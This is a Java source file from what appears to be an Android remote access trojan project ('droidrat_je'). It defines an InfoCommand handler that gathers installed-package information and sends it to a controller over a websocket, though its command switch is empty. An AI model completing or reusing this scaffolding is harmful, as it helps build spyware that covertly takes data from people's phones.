package com.je_chen.droidrat_je.command;

import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.command.process_super.CommandProcessInterface;
import com.je_chen.droidrat_je.modules.appsinfo.getinfo.GetPackagesInfo;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;


public class InfoCommand extends CommandFather implements CommandProcessInterface {

    private GetPackagesInfo getPackagesInfo;

    public InfoCommand(PackageManager packageManager, Context context){
        getPackagesInfo = new GetPackagesInfo(packageManager,context);
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
